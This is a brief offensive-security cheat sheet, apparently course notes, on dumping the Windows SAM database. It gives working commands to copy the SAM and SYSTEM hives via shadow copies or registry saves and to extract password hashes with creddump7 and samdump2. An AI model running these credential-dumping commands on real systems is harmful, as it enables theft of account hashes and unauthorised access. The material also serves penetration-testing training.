# SAM database

## Dumping database

### Shadow Copy

{% code overflow="wrap" %}
```powershell
# Creating a shadow volume
wmic shadowcopy call create Volume='C:\'
# Confirm and get path by listing shadow volumes
vssadmin list shadows
# Shadow copying the SAM database
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
# Shadow copying the SYSTEM file
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
```
{% endcode %}

### Registry

```powershell
# Saving SAM and SYSTEM from the registry
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```

### Extracting hashes

```powershell
# Download Creddrump7 project
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
# Decrypting SAM database with pwdump.py
cd creddump7/
python pwdump.py /home/kali/system /home/kali/sam
# USE THIS INSTEAD
samdump2 ../system ../sam
```
